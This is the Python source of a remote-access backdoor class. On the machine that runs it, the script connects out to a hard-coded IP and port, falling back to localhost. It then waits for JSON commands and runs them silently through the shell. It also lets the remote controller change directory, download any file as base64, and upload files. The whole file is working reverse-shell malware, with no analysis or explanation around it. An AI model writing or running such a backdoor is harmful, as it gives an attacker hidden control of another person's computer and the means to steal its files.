#!C:\Users\TheDarthStar\AppData\Local\Programs\Python\Python37-32\python.exe
import socket
import subprocess as sp
import os,json,base64
class Backdoor:
	def __init__(self,ip="192.168.137.1",port=8888):
		self.TCP_SOCK = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		print("[+] trying "+ip+"@"+str(port))
		try:			
			self.TCP_SOCK.connect((ip,port))
		except Exception:
			try:
				print("[-] "+ip+"@"+str(port)+" failed!")
				print("[+] trying localhost@"+str(port))
				self.TCP_SOCK.connect(("127.0.0.1",port))
			except Exception:
				print("[-] no host online")
	def run(self):
		command = self.reciever()
		if command[0]=='exit':
			self.TCP_SOCK.close()
			exit()
		elif command[0]=="cd" and len(command)>1:
			result = self.change_dir_to(command[1])
		elif command[0]=="download":
			result=self.file_read(command[1])
		elif command[0]=="upload":
			result=self.file_write(command[1],command[2])
		else:
			result = self.run_command(command)
		self.sender(result.decode())
		self.run()
	def run_command(self,command):
		DN = open(os.devnull,'wb')
		result=sp.check_output(command,shell=True,stderr=DN,stdin=DN)
		return result
	def reciever(self):
		recieve = ""
		while 1:
			recieve += self.TCP_SOCK.recv(1024).decode()
			try:
				return json.loads(recieve)
			except ValueError:
				continue
	def sender(self,result):
		self.TCP_SOCK.send(json.dumps(result).encode())
		#get \\\\\\
	def change_dir_to(self,path):
		os.chdir(path)
		return ("[+] changing dir to "+path).encode()
	def file_read(self,file_name):
		with open(file_name,"rb") as files:
			return base64.b64encode(files.read())
	def file_write(self,path,file_content):
		with open(path,"wb") as files:
			print("i'll write a file")
			files.write(base64.b64decode(file_content.encode()))
			send = "[+] "+str(path)+" uploaded!"
			return send.encode()
b = Backdoor()
b.run()